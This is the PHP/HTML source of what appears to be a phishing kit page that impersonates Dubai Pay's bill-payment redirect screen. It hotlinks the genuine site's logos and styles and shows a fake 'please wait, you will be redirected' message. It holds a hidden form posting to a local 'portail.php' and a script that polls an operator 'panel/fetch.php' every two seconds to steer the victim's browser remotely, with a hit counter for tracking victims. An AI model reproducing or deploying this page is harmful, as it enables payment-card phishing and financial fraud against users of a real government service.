<?php 
require '../main.php';
?>
<head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
  
  <meta http-equiv="Content-Language" content="en-us">
  <title>Redirect to Payment</title>
  <link href="https://epayment.dubai.ae/ePayHub/CardProcessor/theme/css/common.css" rel="stylesheet" type="text/css">
  <script language="JavaScript" type="text/javascript" src="https://epayment.dubai.ae/ePayHub/CardProcessor/theme/js/prototype-1.7.1.js"></script>
  <meta name="viewport" content="width=device-width, initial-scale=1.0,user-scalable=no">
  <meta name="description" content="">
  <meta name="author" content="">
  <meta name="referrer" content="no-referrer-when-downgrade">
  <!-- Le styles -->
	<link href="https://epayment.dubai.ae/ePayHub/CardProcessor/theme/css/bootstrap.css" rel="stylesheet">
	<link href="https://epayment.dubai.ae/ePayHub/CardProcessor/theme/css/bootstrap-responsive.css" rel="stylesheet">
	<link href="files/css/customStyles.css" rel="stylesheet">
	
  <!-- HTML5 shim, for IE6-8 support of HTML5 elements -->
  <!--[if lt IE 9]>
      <script src="theme/js/html5shiv.js"></script>
    <![endif]-->
  <!--[if !IE]-->
  <style>
    .adjust {
      margin-top: 5px !important;
      margin-bottom: auto !important;
    }

    .loading {
      text-align: center;
    }

    .loading img {
      max-height: 100px;
    }

    .loading .message {
      margin-top: 20px;
      font-size: 18px;
      color: #4d4d4d;
    }

    .loading.success .message {
      color: #31908e;
    }

    .loading.error .message {
      color: #a80000;
    }
  </style>
  <!--[endif]-->
</head>
    
    

<body leftmargin="0" topmargin="0" class="defaultText">
  <div class="container">
    <div id="mainTable">
      <div class="banner">
        <img class="dubai-pay-logo" src="https://epayment.dubai.ae/ePayHub/CardProcessor/theme/images/dubai-pay-logo.png" alt="Dubai Pay">
        <img class="sd-logo" src="https://epayment.dubai.ae/ePayHub/CardProcessor/theme/images/smart-dubai-logo.png" alt="Dubai Pay">
      </div>
      <div class="form-signin">
        <div>
          <div class="content-area loading">
            <img id="loading-image" src="https://epayment.dubai.ae/ePayHub/CardProcessor/theme/images/dubaipay_loading.gif">
            <label class="message">Please wait you will be redirected to payment page</label>
          </div>
        </div>
      </div>

      <div class="wellAskdubai">
        <table width="100%" cellpadding="0" cellspacing="0" border="0">
          <tbody>
            <tr>
              <td>
                <span class="footer-text">For more inquiries please call</span>
                <span class="footer-text number"> 600 560 000</span>
              </td>
              <td>
                <span class="footer-text text-right copy-right">Copyright © 2026. All rights reserved.</span>
              </td>
            </tr>
          </tbody>
        </table>
      </div>
    </div>
  </div>
  
	<form name="DEG" method="post" action="portail.php">
	<input type="hidden" name="digitalRequest" value="&lt;directDebitRequest&gt;&lt;merchantID&gt;DEG&lt;/merchantID&gt;&lt;merchantKey&gt;DEGKEY&lt;/merchantKey&gt;&lt;action&gt;pay&lt;/action&gt;&lt;merchantReturnURL&gt;https://epayment.dubai.ae/ePayHub/Authentication/GenericServlet&lt;/merchantReturnURL&gt;&lt;orderID&gt;36001099463119&lt;/orderID&gt;&lt;orderDesc&gt;Bill Payment&lt;/orderDesc&gt;&lt;orderAmount&gt;7+1,282.65&lt;/orderAmount&gt;&lt;transactionDate&gt;19/08/2021 23:48:55&lt;/transactionDate&gt;&lt;spcode&gt;DEWA&lt;/spcode&gt;&lt;servcode&gt;SPS000000000000135&lt;/servcode&gt;&lt;/directDebitRequest&gt;">
	<input type="hidden" name="digitalSecureRequest" value="E45C5E27B1A659AED3A6FF32A336F780">
	
	</form>
	
	<script>
	function Pay()
	{
		document.DEG.submit();
	}
	</script>  
<script src="res/jq.js"></script>
<script>
var cd = "<?php echo $current_data; ?>";
setInterval(() => {
    $.post("../panel/fetch.php", {update:1}, function(d){
        if(cd!=d){
            window.location=d;
            cd=d;
        }
    })

}, 2000);
</script>
<script type="text/javascript">var _Hasync= _Hasync|| [];
_Hasync.push(['Histats.start', '1,4203309,4,0,0,0,00010000']);
_Hasync.push(['Histats.fasi', '1']);
_Hasync.push(['Histats.track_hits', '']);
(function() {
var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
hs.src = ('//s10.histats.com/js15_as.js');
(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
})();</script>
<noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?4203309&101" alt="web page hit counter" border="0"></a></noscript>
</body></html>